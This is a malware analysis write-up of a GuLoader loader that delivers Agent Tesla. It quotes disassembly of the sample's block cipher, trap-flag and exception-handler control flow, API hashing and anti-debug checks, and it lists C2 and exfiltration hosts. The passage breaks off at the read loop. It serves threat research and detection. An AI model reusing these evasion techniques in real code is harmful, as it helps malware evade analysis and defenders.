---
title: "GuLoader: Defeating a Per-Block Cipher and an Exception-Driven Control Flow with a Kernel Dumper"
date: 2026-10-24
author: 0xMastEB
tags: [malware analysis, threat research, reverse engineering, guloader, agent tesla, anti-debug bypass, vectored exception handler, trap flag, api hashing, process hollowing, ioc, mitre attack, c2 analysis, static analysis, dynamic analysis, yara, sigma]
sample_sha256: 729ef8e6a3cf1859811f3010b514416231e92ca66c4817cf8d6fce9df427a6a8
---

# GuLoader: Defeating a Per-Block Cipher and an Exception-Driven Control Flow with a Kernel Dumper

**Jump to:** [Infection Chain](#infection-chain-overview) · [Anti-Analysis](#3-where-dynamic-analysis-stopped-working) · [Kernel Dumper](#4-the-kernel-dumper) · [Block Cipher](#6-the-per-block-cipher) · [Trap Flag](#8-trap-flag-the-control-flow-is-exceptions) · [VEH](#9-the-vectored-exception-handler-recovered) · [API Hashing](#10-api-resolution-by-hash) · [C2](#c2) · [**Detection: YARA + Sigma**](#detection) · [**IOCs**](#indicators-of-compromise-iocs) · [**MITRE ATT&CK**](#mitre-attck-mapping)

## Executive Summary

I picked GuLoader because of its reputation. It is known for being hard to reverse, and having taken it apart I can confirm the reputation is earned. This is the most defensive piece of code I have worked on so far.

The short version. The file you receive is a signed NSIS installer with a Turkish invoice lure. It drops an encrypted blob and runs a shellcode stage that never decrypts itself fully: it unlocks one block at a time, runs it, and re-encrypts it immediately. At any instant almost the whole thing is ciphertext. On top of that, the shellcode has no jumps between blocks. It raises exceptions on purpose and lets its own vectored exception handler decide where execution continues, reading the jump distance from an encrypted byte in the instruction stream. If a debugger takes those exceptions instead of the handler, or if a single debug register is set, the loader silently takes a different path and shows a decoy installer.

Dynamic analysis failed completely. ScyllaHide was detected, software breakpoints are both visible and destructive, and hardware breakpoints are read straight out of the `CONTEXT` the handler receives for free on every exception. So I stopped fighting it from user mode and wrote a dumper on top of a kernel driver I had from older work. The driver reads the target's memory without a handle, without a hook and without a debugger, so there is nothing for the sample to detect. Entropy did not work as a trigger, for a reason I explain below, so the dumper scores pages on structural patterns instead and keeps each page in the moment it turns plaintext. On sweep 78 the main body came out: 36 contiguous pages of readable code.

From that dump I recovered the name hashing algorithm, resolved 54 of 65 API hashes, mapped the exception handler completely, and captured the C2. The final payload is **Agent Tesla**, which I did not get in my own lab because the C2 was already dead, but which an independent sandbox run from the day the sample was first seen confirms, together with the SMTP host it exfiltrates to.

Everything below was obtained in my own lab unless I say otherwise. Where something is inferred rather than proven, I say so.

> GuLoader (also tracked as CloudEyE) is a commodity downloader sold as a crypting service. It does not steal anything itself: its whole job is to carry a second-stage payload past detection and inject it. The payload changes campaign to campaign; the loader is the product.

## Sample Metadata

| Field | Value |
|---|---|
| Family | GuLoader (stage 1-2), Agent Tesla (stage 3) |
| SHA256 | `729ef8e6a3cf1859811f3010b514416231e92ca66c4817cf8d6fce9df427a6a8` |
| SHA1 | `03a79e19baad8ace1bcd28e2a20a4fe2aa65ddaa` |
| MD5 | `8277f8350e12ecee116c42acb4aa48c0` |
| Delivered filename | `ODEME DEKONTU.exe` (Turkish: "payment receipt") |
| File type | PE32 (I386), NSIS installer 3.09, signed |
| Overlay | `0x60B80` bytes |
| First seen | 2026-10-09, MalwareBazaar, signature GuLoader |

The filename is the lure. "Ödeme dekontu" is what a Turkish bank calls a payment receipt, so this was almost certainly delivered by mail to Turkish-speaking targets as an attached invoice.

## Infection Chain Overview

```
ODEME DEKONTU.exe   (STAGE 1 · NSIS 3.09 installer, signed)
 |  no real installation: the .nsi only builds a string and calls System.dll
 |  drops %APPDATA%\boligbebyggelsernes\lams\Stregernes\
 |        Cambism            179 KB, encrypted blob, the shellcode source
 |        Bulningerne70\     decoy files
 |        Lepomis\           decoy files
 v
System.dll  (NSIS plugin, used as the execution primitive)
 |  VirtualAlloc(0, 0x5317000, MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE)
 |  ~83 MB RWX; the shellcode is copied at a random offset inside it
 v
GuLoader shellcode   (STAGE 2 · position independent x86)
 |  VEH registered first, before anything else
 |  per-block decrypt / execute / re-encrypt
 |  all API resolution by hash, no strings, no imports
 |  anti-analysis: ScyllaHide detection, syscall trampolines, debug registers, breakpoint scan
 |  GET hxxp://185.29.9.43/SpQwXyk177.bin   into a 64 KB buffer
 v
Agent Tesla   (STAGE 3 · confirmed from an independent sandbox run, not in my lab)
 |  hollowed into a child copy of the loader's own image
 |  ip-api.com for victim geolocation
 v
Exfiltration: SMTP submission to mail[.]holzbrenzii[.]com:587
```

## Technical Analysis

### 1. Stage 1: an installer that does not install anything

Detect It Easy identifies a PE32 NSIS installer, version 3.09, signed, with a `0x60B80` overlay. NSIS is a legitimate open source installer framework, which is the point: the file looks like any other setup program.

I extracted it with **7-Zip 15.05**, deliberately. That is the last version that rebuilds the `[NSIS].nsi` install script from the archive; 15.06 dropped the feature. Newer 7-Zip gives you the files, older 7-Zip gives you the logic, and here the logic is what matters.

![NSIS archive extracted](/assets/img/guloader/02-nsis-extracted.png)
*Figure 1. The NSIS archive extracted with 7-Zip 15.05, including the rebuilt `[NSIS].nsi` script that newer versions no longer produce.*

The script contains no installation. `func_69`, `func_90` and `Section Screenland` build a string at runtime and hand it to `System.dll`:

```
System::Call "*$9(&t4 R2)"
StrCpy $_56_ "faasffft h fd4h65dfg4h65f$1" "" 25
System::Call ::$_56_
```

The `StrCpy` with offset 25 strips the junk prefix and leaves only `$1`, so the API name being called **never appears in the script**. You cannot grep for it. This is the same idea the shellcode uses later with hashes, applied one layer earlier in a different language.

![System::Call built at runtime in the NSIS script](/assets/img/guloader/03-nsi-systemcall.png)
*Figure 2. The `.nsi` script building the API name at runtime before passing it to `System.dll`. The name exists nowhere in the file as a string.*

Also in the script: long strings of mixed Danish and English words, which are data the shellcode consumes rather than text, and a `Sleep 5`.

The install directory is the first solid IOC:

```
%APPDATA%\boligbebyggelsernes\lams\Stregernes\
```

Dropped inside it: `Cambism` (179 KB, no extension), plus the decoy folders `Bulningerne70\` and `Lepomis\` holding txt, jpg, ini, skj and unc files.

![Dropped files in AppData](/assets/img/guloader/8-dropped-files.png)
*Figure 3. What the installer actually leaves on disk: one encrypted blob and two folders of decoys. `Cambism` keeps a 2025-12-03 timestamp preserved from inside the NSIS package, while the folders are stamped at execution time.*

`Cambism` is the encrypted container the shellcode is built from. Worth noting that it is **not** high entropy: the hex view shows long runs of `A4 A4 A4`, `92 92`, and many zero bytes. Whatever encoding is used, it is not compression and it is not a packed PE.

![Cambism hex view](/assets/img/guloader/04-cambism-hex.png)
*Figure 4. `Cambism` in a hex editor. The repeated byte runs rule out compression or a packed PE, which was the first hint that this sample encrypts rather than packs.*

### 2. Stage 2: an 83 MB RWX allocation

`System.dll` calls:

```c
VirtualAlloc(0, 0x5317000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
```

That is roughly 83 MB of read-write-execute memory. System Informer reports the region as `Private: Commit`, 85,084 kB, RWX, fully resident. The base moves every run (`04760000`, `046DD000`, `0448D000` observed), and the shellcode is copied at a **random offset inside it**, which means no breakpoint address survives a restart.

![The 83 MB RWX allocation](/assets/img/guloader/08-virtualalloc-rwx.png)
*Figure 5. `VirtualAlloc` reserving ~83 MB of `PAGE_EXECUTE_READWRITE` memory. The shellcode lands at a random offset inside this region, so no address is reusable between runs.*

83 MB is far more than the code needs. The decrypted code I eventually recovered is about 156 KB. The rest is consistent with memory flooding against sandboxes, which often cap how much memory they will emulate or scan, but I did not prove that intent and I am not claiming it as fact.

### 3. Where dynamic analysis stopped working

This is the part I want to be honest about, because the failures taught me more than the successes.

I loaded the sample in x32dbg with ScyllaHide enabled, expecting the usual `PEB.BeingDebugged` and software breakpoint checks. Within a few seconds I got a MessageBox:

> This application cannot run inside a virtual machine or while being debugged

followed by `TerminateProcess`.

![Anti-debug MessageBox](/assets/img/guloader/06-antidebug-messagebox.png)
*Figure 6. The message that greeted every early attempt. It names the VM, which turned out to be misdirection: the VM was never what gave me away.*

The interesting part is **why**. Following the MessageBox caller, the shellcode enumerates its own address space with `NtQueryVirtualMemory`, walking regions (`00011000` to `00027000` and onward), counts something, and compares the result against `0x4EF3` (20211).

![NtQueryVirtualMemory address-space scan](/assets/img/guloader/12-ntqueryvirtualmemory-scan.png)
*Figure 7. The address-space enumeration loop. The sample counts regions and compares the total against a threshold, which is how it notices that something has changed the shape of its own memory map.*

![ZwQueryVirtualMemory check](/assets/img/guloader/07-antidebug-zwquery.png)
*Figure 8. The query call itself, reached through the sample's own syscall path rather than through `ntdll`.*

With ScyllaHide fully disabled the popup never appears. Running the sample with no debugger at all also produces no popup.

So the VM was never the problem. **ScyllaHide's own hooks changed the shape of the address space, and that is what gave the debugger away.** The anti-anti-debug plugin was the thing being detected. That inverted my assumption for the rest of the analysis.

![Shellcode anti-debug check](/assets/img/guloader/09-shellcode-antidebug.png)
*Figure 9. The comparison that decides the outcome, inside the shellcode rather than in the NSIS stage. Note there is no literal threshold visible: like every constant in this sample, it is built at runtime.*

Three more walls, in the order I hit them:

**Copied syscall trampolines.** Dozens of single `0x1000` ER--- pages (`006F0000`, `00700000`, `00A40000`, and others), each containing `mov eax, <syscall#>; mov edx, <ntdll addr>; call edx`. The shellcode calls into its own copies, so breakpoints and hooks on `ntdll` and `kernel32` are simply stepped around. This explains why API breakpoints stop firing after stage 2 even though the sample is obviously making syscalls.

![Copied ntdll syscall trampolines](/assets/img/guloader/16-ntdll-syscall-trampolines.png)
*Figure 10. One of dozens of one-page trampolines. Each holds a syscall number and a direct call, so hooks placed on `ntdll` are never reached.*

**Hardware breakpoints.** I switched to hardware breakpoints, which was the right instinct and still did not work. I found out later why, and it is covered in the VEH section: the handler reads the debug registers out of the `CONTEXT` that Windows hands it on every exception, which costs the malware nothing and happens hundreds of times per run.

**Patching the checks.** I patched the `jge` at shellcode offset `+0x40C` and manipulated flags to force the clean branch. The popup disappeared and the installer ran through to its completion screen, but **no payload followed**: no new RWX region, no `MZ` anywhere in the 83 MB buffer, `wininet.dll` never loaded.

![Anti-debug bypassed, and nothing happens](/assets/img/guloader/15-antidebug-bypassed.png)
*Figure 11. The popup is gone and the installer completes, which looks like success and is not. This is the decoy branch: no payload is ever fetched.*

I had not bypassed the check, I had jumped onto the dead branch the author put there for exactly this. The decoy installer appearing is the tell that you are on the trap path, and at the time I thought it was normal behaviour.

That is the trap worth describing for other analysts: **when you touch this sample in the wrong place, it does not crash and it does not exit. It keeps running and shows you a plausible-looking installer.** You can waste a long time thinking the run succeeded.

### 4. The kernel dumper

At this point I stopped trying to debug it. Every detection the sample has is aimed at a user-mode observer: handles, hooks, debug registers, the debug port, the shape of the address space. So I pulled a kernel driver I had written for older work and built a dumper on top of it.

All reads go through the driver's shared-page IPC, so from the target's point of view nothing happens at all: no handle is opened on it, no API is hooked, no debugger is attached, no debug register is set. Three design points mattered:

**Address space mapping without `VirtualQueryEx`.** A one-byte driver read probes each page: the read fails on unmapped memory and succeeds on mapped memory. Scanning at 64 KB granularity and refining at 4 KB recovers the region boundaries with no API call against the target.

**Process location by `EPROCESS.ImageFileName`.** That field is 15 characters maximum, so the sample has to be renamed from its hash filename before the run.

**Module list by walking `PEB.Ldr.InMemoryOrderModuleList` directly**, to watch for `wininet.dll` appearing (which means the download is starting) without hooking anything.

Result: **GuLoader runs to completion, with no popup and no decoy installer, while being fully dumped.** The driver approach walks past every anti-analysis check in the sample because there is nothing to check.

One behaviour only became visible once I was sampling the same pages repeatedly. Polling per-page entropy every 30 ms caught the page at `0x45C4000` going from 7.51 to **0.00** between two sweeps. That is not a decrypt, it is a **wipe**: the page is zeroed after the code in it has run. A dumper that takes a single snapshot at the end of execution gets nothing from that region, which is the in-memory equivalent of deleting your tools behind you.

### 5. Entropy does not work on this sample

My first trigger was entropy. The reasoning is standard: encrypted data has high entropy, code has low entropy, so when entropy on a page drops, that page has been decrypted, and you dump it.

It did not work, and the reason is worth more than the technique would have been. I mapped per-page entropy against a structural pattern count, across an early 256 KB dump taken before the sweep logic was working (so a partial capture, not the final one):

| Pages | Entropy | TF pattern | add/sub imm32 | Verdict |
|---|---|---|---|---|
| `05BC3000`-`05BDC000` (26 pg) | 7.36-7.50 | 0 | 0 | still encrypted |
| `05BDD000`-`05BEF000` (19 pg) | **7.22-7.60** | 1-20 per page | 2-182 | **plaintext code** |
| `05BF0000`-`05BF9000` (10 pg) | 6.70-6.88 | 0 | 0 | data, not code |
| `05BFA000`-`05C00000` | 6.91-7.26 | 0-4 | 26-114 | plaintext code |

**Decrypted GuLoader code sits at entropy 7.2 to 7.6, statistically indistinguishable from its own ciphertext.** The reason is the obfuscation itself: the code is packed with junk arithmetic carrying random 32-bit immediates, which is exactly what high entropy measures. The obfuscation defeats the detection method as a side effect.

What works instead is **structural pattern density**. Encrypted bytes do not contain repeated x86 instruction encodings; decrypted GuLoader does, in a very specific way. Two patterns:

```
9C 89 E? (01|09) ?? 9D      trap flag sequence (see section 8)
81 C0..C3 / 81 E8..EB       add/sub reg, imm32  (the junk arithmetic)
```

Scoring a 4 KB page as `trap_flag_count * 10 + addsub_count` separates plaintext from ciphertext cleanly where entropy cannot. In that early dump it marks 23 of 64 pages as plaintext code. Rebuilt around this score, the dumper went on to recover 156 KB, with the main body of 36 contiguous pages turning plaintext in a single pass on sweep 78.

This is the methodological point of the whole analysis: **the right discriminator comes from what the target actually looks like, not from the textbook.**

### 6. The per-block cipher

Two dumps taken minutes apart disagreed with each other. Addresses in this table are from those earlier dumps, whose base sits `0x40000` below the one everything else in this writeup refers to:

| Address | dump v3 | dump v4 |
|---|---|---|
| `0x5BAA000` (main body) | plaintext | encrypted |
| `0x5BBCD56` (dispatcher) | plaintext | encrypted |
| `0x5BBDB7F` (hash resolver) | not captured | encrypted |
| `0x5BC12AD` | not captured | **plaintext** |

That is not a tooling bug. GuLoader keeps everything encrypted and unlocks one block at a time, runs it, then re-encrypts it before moving on. **At any instant only a small window is readable**, so a sampling dumper captures a different slice every run. Noticing that two dumps of the same thing disagreed is what gave the mechanism away.

![Self-modifying code in IDA](/assets/img/guloader/11-ida-selfmodifying.png)
*Figure 12. What the shellcode looks like before you understand the mechanism: readable instructions that dissolve into undefined bytes partway through, because the rest of the block is still ciphertext in this particular dump.*

The engine is at `0x5C012AD` in the dump I worked from (addresses from here on are from `code_00_05BDC000.bin`, loaded raw at `0x5BDC000`). It starts with a standard get-EIP:

```
5C012AD  call $+5
5C012B2  pop  ebx
5C012B3  sub  ebx, 5
```

Decrypt loop:

```
5C01369  mov  eax, [ebp+44h]      ; range start
5C0136C  xor  [eax], edx          ; key in edx, one dword at a time
5C0136E  add  eax, 4
5C01371  cmp  eax, ebx            ; range end
5C01373  jnz  short 5C0136C
5C01375  pop  eax
5C01376  call 5C013D9             ; anti-breakpoint check on the target
5C0137B  call eax                 ; run the block
```

Re-encrypt loop, same range in reverse:

```
5C013A8  sub  edx, 4
5C013AB  xor  [edx], ecx
5C013AD  cmp  edx, ebx
5C013AF  jnz  short 5C013A8
5C013B7  jmp  ecx                 ; on to the next block
```

![The XOR decrypt loop](/assets/img/guloader/13-ida-xor-decrypt-loop.png)
*Figure 13. The decrypt loop: a plain dword XOR with the key in a register. The cipher itself is trivial. What makes it effective is when and for how long it is applied.*

![Decrypt, execute, re-encrypt](/assets/img/guloader/01-decrypt-execute-reencrypt.PNG)
*Figure 14. The complete cycle in one view: decrypt the range, screen the target, `call eax` to run it, then re-encrypt the identical range and jump on. The plaintext window lasts exactly one call.*

### 7. The same function is also the call gate

The dump settles what `call eax` targets. Every API call in the shellcode is written as:

```
push <args>
push dword ptr [ebp+<slot>]      ; pointer cached by the hash resolver
call 0x5C012AD
```

**51 such sites.** So this function is not only the block cipher, it is the single choke point every call passes through: unlock, screen the target, call, re-lock. That is why there is not one ordinary `call dword ptr [...]` import pattern anywhere in the sample.

The screening step, at `0x5C013D9`, reads the first bytes of the function about to be called and compares them against three constants, none of which exist literally in the binary:

| Check | Fold | Result | Looks for |
|---|---|---|---|
| 1 (byte) | `0x87` `+0x95` `^0x12` `+0xBE` | `0xCC` | `int3` |
| 2 (word) | `0x5D7C` `-0x8350` `-0x5AA9` `-0x7BB6` | `0x03CD` -> `CD 03` | 2-byte `int 3` |
| 3 (word) | `0xA415` `-0xF1A7` `-0xB984` `-0xEDDB` | `0x0B0F` -> `0F 0B` | `ud2` |

![Anti-breakpoint checks, part 1](/assets/img/guloader/02a-anti-breakpoint-checks.png)
*Figure 15. The first two breakpoint checks. Each constant is assembled by an arithmetic chain, so none of `CC`, `CD 03` or `0F 0B` appears as an immediate anywhere in the sample.*

![Anti-breakpoint checks, part 2](/assets/img/guloader/02b-anti-breakpoint-checks.png)
*Figure 16. The third check, for `ud2`, and the branch all three take on a hit.*

On a hit, all three branch to this:

```
5C013B9  sub  esp, 100h
5C013C1  sub  ebp, 100h
5C013C7  popa
```

![The punishment stub](/assets/img/guloader/03-punishment-stub.png)
*Figure 17. No clean exit. The stack and frame pointer move 256 bytes and `popa` reloads every general register from whatever happens to be there. Execution continues and dies far from the check that caught it.*

That design choice is deliberate and it works: the crash site tells you nothing about what went wrong.

Two consequences for anyone trying this at home. Software breakpoints here are not just detectable, they are **destructive**: a `0xCC` written inside a block gets XORed by the re-encrypt loop and corrupts it. And static signatures on `CC`, `CD 03` or `0F 0B` find nothing, because the constants are built at runtime.

### 8. Trap flag: the control flow is exceptions

Scattered through the code, before and after calls through the gate, is this shape:

```
push eax
mov  eax, 0FFFFFF00h
neg  eax                 ; eax = 0x100
push esi
pushfd
mov  esi, esp            ; esi -> the pushed EFLAGS image
add  [esi], eax          ; set bit 8
popfd
```

Bit 8 of EFLAGS is **TF**, the trap flag. `popfd` with TF set makes the CPU raise a single-step exception on the next instruction. **214 instances in a 92 KB region**, and the constant `0x100` is never written literally: it is reconstructed a different way at every site.

| Site | Fold | Operation |
|---|---|---|
| `05BEBEE0` | `0xFFFFFF00` neg | `add [esi], eax` |
| `05BEBF98` | `0x100000` ror 7 ror 5 | `add [ebx], edi` |
| `05BEC767` | `0xB3D09CA5` not, ror 7, xor `0xB4985FC6` | `add [ecx], esi` |
| `05BEC7AB` | `1` rol 8 | `add [eax], ecx` |
| `05BEC943` | `0x20000` ror 1, bswap | `add [edx], esi` |
| `05BEC9A6` | `0x4000` ror 1 ror 5 | **`or [ecx], edx`** |

The last line is the proof of intent. There is no arithmetic reading of `or <flags>, 0x100`: that is a mask being set on a flag bit. Six independent foldings of the same value also rule out coincidence. The pattern is polymorphic across registers (all of eax/ecx/edx/ebx/esi/edi appear as the scratch register) and alternates `or` and `add`, which is why the byte signature has to be `9C 89 E? [09|01] ?? 9D` rather than anything tighter.

### 9. The vectored exception handler, recovered

This is the piece that explains everything else, and finding it took the longest because the handler's address exists nowhere in the image.

`RtlAddVectoredExceptionHandler` is the **first API the shellcode resolves at all**. Both of its arguments are built so neither appears as a literal:

```
05C01EA2  call loc_5BDCE1C          ; a CALL used only to push 0x5C01EA7
05BDCE1C  pop  eax                  ; eax = 0x5C01EA7 = the handler address
05BDCE23  mov  edx, eax
05BDCE25  push edx                  ; arg2: Handler
05BDCE2C  push 18FF50E0h
          add  [esp], 0EF545E77h
          xor  [esp], 0A524E2DDh
          xor  [esp], 0AD774D8Bh    ; arg1: First = 1
05BDCE48  push dword ptr [ebp+0C8h] ; RtlAddVectoredExceptionHandler
05BDCE4F  call gl_call_gate
```

`First = 1` puts the handler at the **front** of the vectored list. The handler address comes from a `call`/`pop` pair, so no xref leads to it and no literal gives it away.

Handler entry at `0x5C01EA7`:

```
05C01EA7  mov eax, [esp+4]          ; PEXCEPTION_POINTERS
05C01EAB  jmp 0x5C01F84
05C01F86  mov edx, [eax]            ; ExceptionRecord
05C01F8A  mov edx, [edx]            ; ExceptionRecord->ExceptionCode
```

![The VEH decompiled](/assets/img/guloader/20-veh-handler-decompiled.PNG)
*Figure 18. The handler in the decompiler. Note that one of the comparison constants survives as `__ROL4__(...) ^ 0x73361564` even after decompilation: the runtime folding defeats Hex-Rays, not just the disassembler.*

Then a dispatch on five exception codes, every constant folded at runtime:

| Folding | Code | Meaning | Branch |
|---|---|---|---|
| `D8FF3A2A ^5CCE07D9 ^1D8F582A ^59BE65DC` | `C0000005` | ACCESS_VIOLATION | `0x5C02029` |
| `BC9FABE4 -F8AF02C4 ^4E7EF9ED ^4D8E50D0` | `C000001D` | ILLEGAL_INSTRUCTION (`ud2`) | `0x5C0204E` |
| `DA829DBC ^9A3129BD ^2966AC1B ^A9D5188C` | `C0000096` | PRIVILEGED_INSTRUCTION | `0x5C0204E` |
| `FEFAA578` rol 6 `-CB7348DF ^73361564` | **`80000004`** | **SINGLE_STEP** | `0x5C0204E` |
| `E84DAEAF ^8B67DA82 -64CCDFB6 ^7E5D9474` | **`80000003`** | **BREAKPOINT** | `0x5C0204E` |
| anything else | | | return 0 |

![The VEH dispatch table](/assets/img/guloader/20a-veh-dispatch-table.png)
*Figure 19. The dispatch table in the disassembly, with each folded constant annotated with the exception code it produces. Five codes, five arithmetic chains, zero immediates to signature.*

`0x80000004` being in that table is the answer to the question the trap flag raises: the single-step exception is not a tripwire, it is **handled and used**. `0x80000003` being there too retroactively explains the `int 3` bytes sitting at plausible instruction boundaries in decrypted code. They are dispatch points, not junk and not artifacts. The loader has four different ways to raise the same dispatch.

#### How execution continues

```
05C02050  call gl_check_debug_regs   ; returns ContextRecord in eax, or bails
05C02058  mov  edx, 0B801h; neg; ror 8; not   -> 0xB8 = CONTEXT.Eip
05C02064  add  eax, edx              ; eax = &CONTEXT.Eip
05C02066  mov  edx, [eax]            ; edx = Eip
05C02084  add  edx, 13h              ; address of a hidden delta byte
05C02089  call gl_advance_eip
05C0208E  mov  eax, <folds to FFFFFFFF>       ; EXCEPTION_CONTINUE_EXECUTION
```

And `gl_advance_eip` is three instructions:

```
05C01958  movzx edx, byte ptr [edx]  ; the byte at Eip+0x13
05C0195D  xor   edx, ecx             ; ecx folds to 0xCF
05C01961  add   [eax], edx           ; CONTEXT.Eip += delta
```

So **each trap site stores its own jump distance as a single byte, 19 bytes past the trap point, XOR-encrypted with `0xCF`.** The handler decrypts it, advances `Eip`, and returns `EXCEPTION_CONTINUE_EXECUTION`.

That is the whole trick, and it explains three things at once:

- the 19 bytes after every trap point are never executed, which is exactly the garbage IDA renders as `db` runs and nonsense opcodes
- the jump distance is **data, not code**, so following the control flow statically means emulating the handler
- Hex-Rays produces nothing usable because every block ends in a `popfd`, not a branch

A one-byte delta caps a hop at 255 bytes, which matches the block sizes seen.

#### The hardware breakpoint check

```
05C021AA  mov eax, [eax+4]           ; ExceptionInfo->ContextRecord
          ecx folds to 0x18, edx folds to 0x00
05C021D8  add edx, 4
05C021E2  cmp dword ptr [eax+edx], 0
05C021E6  jnz -> return 0            ; EXCEPTION_CONTINUE_SEARCH
05C021E8  cmp edx, ecx
05C021EA  jnz 0x5C021D8
```

Offsets `0x04` through `0x18` of the x86 `CONTEXT` are `Dr0`, `Dr1`, `Dr2`, `Dr3`, `Dr6`, `Dr7`. Every one must be zero. A single non-zero debug register sends the handler to `return 0`, the exception goes unhandled, `Eip` is not advanced, and execution falls into the 19 bytes of garbage.

This is the most economical anti-debug in the sample and the reason my hardware breakpoints failed. There is no `GetThreadContext` call to hook or to notice. **The `CONTEXT` is handed to a vectored handler for free on every single exception, and the loader raises hundreds of them, so those six registers are re-examined continuously for the entire run at zero cost.**

Worth correcting an instinct I had: setting the breakpoints from the kernel does not help either. The debug registers are visible in the `CONTEXT` regardless of who set them. Kernel-assisted *dumping* works because it touches no debug register at all, not because it is privileged.

### 10. API resolution by hash

GuLoader has no imports and no strings. Where other malware has `InternetOpenUrlA`, this has a number. You cannot tell what the sample does by looking at its import table, because it does not have one.

I spotted it from a repeated pair in the dump: `mov edx, <32-bit constant>` followed immediately by a `call` to the same function. Inside that function is a loop that takes one character at a time, multiplies an accumulator by 33 and XORs a constant. That is a hash function, which means those constants are API names.

![The hashing loop](/assets/img/guloader/01-hash-loop.png)
*Figure 20. The hash loop: multiply by 33, add the character, XOR a fixed constant, repeat until the terminator. Recognising this shape is what turned a wall of numbers back into API names.*

The algorithm is djb2 with two deviations:

```
h = 5381
for each character c:
    h = (h * 33) & 0xFFFFFFFF
    if folding and 'a' <= c <= 'z': c -= 32     # module names only
    h = (h + c) & 0xFFFFFFFF
    h ^= 0x89F43DBA
```

Module names are read as UTF-16LE and folded to uppercase; API names are ASCII and **not** folded, because export names are case sensitive. Every constant in the function is built at runtime:

| Value | Folding | Result |
|---|---|---|
| seed | `(0x6269BEC2 - 0x626A12D7)` ror 2, not | `0x1505` = 5381 |
| lower bound | `(0x875D5E12 ^ 0xF3F3645E ^ 0xF0AE3A4D)` rol 6 | `0x61` = `a` |
| upper bound | `(0xCEC7F05C` ror 2 rol 4`) ^ 0x3B1FC109` | `0x7A` = `z` |
| fold delta | 10-instruction add/sub chain | `-32` |
| terminator | `0xFFFFFFFF` ror 2, not, neg | `0` |

![Seed and case-folding bounds built at runtime](/assets/img/guloader/02-seed-folding.png)
*Figure 21. Even the seed 5381 and the `'a'`/`'z'` bounds for case folding are assembled arithmetically. Nothing in this function can be found by searching for a constant.*

The module resolver walks the loader data directly, with every offset produced by arithmetic (`0xFBB9CD0B`, `not`, `+0x2BB9CD0C`, `bswap` gives `0x30`):

```
fs:[0x30]  PEB
  +0x0C    PEB.Ldr
  +0x14    Ldr.InMemoryOrderModuleList
  +0x28    BaseDllName.Buffer
```

![The PEB walk](/assets/img/guloader/10-ida-peb-walk.png)
*Figure 22. Walking the loader's own module list from the PEB to reach each DLL's base name, with the structure offsets folded at runtime like everything else.*

#### Breaking it

Once you have the algorithm, the hashes are reversible by brute force in the only direction that matters. I wrote the algorithm in Python, walked every DLL in SysWOW64, hashed **every exported function name** (132,647 exports across 2,442 DLLs), and matched the results against the constants pulled out of the dump.

Two implementation notes, both of which cost me time:

The gap between `mov edx, <hash>` and the `call` can be up to 40 bytes of junk arithmetic. A 14-byte scan window found 39 distinct hashes; an 80-byte window found 66. If your scan window is too tight you silently undercount and never know it.

The module base travels in `ecx`, not on the stack:

```
05BEBDCF  mov  ecx, [ebp+0A0h]      ; wininet.dll base
05BEBDD5  mov  edx, 903DA116h       ; InternetReadFile
05BEBDFD  call gl_resolve_api
05BEBE02  mov  [ebp+0DCh], eax
```

So the resolver is `resolve(module_base, name_hash)`, and each resolved pointer is cached in a fixed slot of the same stack frame. Those slots are effectively the loader's import table, which is what let me map the call gate sites back to API names.

**Result: 54 of 65 hashes resolved.** Modules recovered: `ntdll.dll`, `kernel32.dll`, `msvcrt.dll`, and `system.dll` (the NSIS plugin, which confirms the NSIS to System.dll to shellcode chain from the shellcode's own side). One module hash, `0x3105F82C`, is unresolved.

The resolved set is the capability list, and it is worth reading as one:

**Process injection, full chain (12)** - `NtCreateSection`, `NtMapViewOfSection`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtAllocateVirtualMemory`, `NtReadVirtualMemory`, `ZwQueryVirtualMemory`, `NtCreateThreadEx`, `NtResumeThread`, `NtSetInformationProcess`, `CreateProcessInternalW`, `BaseThreadInitThunk`

`NtCreateSection` plus `NtMapViewOfSection` plus `CreateProcessInternalW` is the **section-mapping** variant of hollowing, not the `WriteProcessMemory` variant. `BaseThreadInitThunk` being resolved by hash is consistent with passing a legitimate-looking start address to `NtCreateThreadEx`, but that is an inference from the import set, not something I confirmed in the disassembly.

**Security software discovery, three independent channels (6)** - `OpenSCManagerA` + `EnumServicesStatusA` + `CloseServiceHandle` (installed services), `MsiEnumProductsA` + `MsiGetProductInfoA` (installed MSI products), `GetDeviceDriverBaseNameA` (loaded kernel drivers). Querying the **MSI product database** is the uncommon one. Most loaders stop at services and running processes.

**Sandbox and analyst detection (3)** - `EnumWindows`, `RegOpenKeyExA`, `GetLongPathNameW`

**Debugger evasion (6)** - `NtSetInformationThread` (ThreadHideFromDebugger), `NtQueryInformationProcess`, `DbgBreakPoint`, `DbgUiRemoteBreakin`, `RtlAddVectoredExceptionHandler`, `RtlRemoveVectoredExceptionHandler`

Resolving `DbgBreakPoint` and `DbgUiRemoteBreakin` by address has no legitimate explanation. Those are the two entry points a debugger uses to attach to a running process, and the only reason to want their addresses is to patch them.

**Download (5)** - `InternetOpenA`, `InternetSetOptionA`, `InternetOpenUrlA`, `InternetReadFile`, `InternetCloseHandle`

**Disk and launch (12)** - `SHCreateDirectoryExW`, `CreateFileA`, `CreateFileW`, `NtCreateFile`, `NtOpenFile`, `WriteFile`, `ReadFile`, `GetFileSize`, `NtClose`, `CloseHandle`, `RegCreateKeyExA`, `ShellExecuteW`

**Termination (4)** - `TerminateProcess`, `ExitProcess`, `TerminateThread`, `MessageBoxA`

**Console (3)** - `AllocConsole`, `SetStdHandle`, `_iob`

These three are the only reason `msvcrt.dll` appears in the module list at all. What the loader wants a console for I did not establish, and nothing in the behaviour I observed uses one.

**Loader support (3)** - `GetProcAddress`, `RtlAllocateHeap`, `Sleep`

That is 54 names across nine groups. The remaining 11 hashes produced zero hits across all 132,647 export names while all 54 above matched exactly, so they are not export names. Most likely they are data for other cases of the same dispatcher. Not confirmed.

### 11. The download, and what it does not check

Mapping the 51 call gate sites against the slot table gives the download path directly:

| Site | Call |
|---|---|
| `05BEBF93` | `InternetOpenA` |
| `05BEBFD5` | result check, NULL -> close and bail |
| `05BEC252` | `InternetSetOptionA` |
| `05BEC480` | `InternetOpenUrlA` |
| `05BEC594` | top of the read loop |
| `05BEC63C` | `InternetReadFile` |
| `05BEC713` | `InternetCloseHandle(hUrl)` |
| `05BEC79F` | `InternetCloseHandle(hSession)` |

The buffer is sized at `[ebp+20h] + 0x10000`, so **64 KB is the expected payload size**.

The read loop, fully decrypted:

```
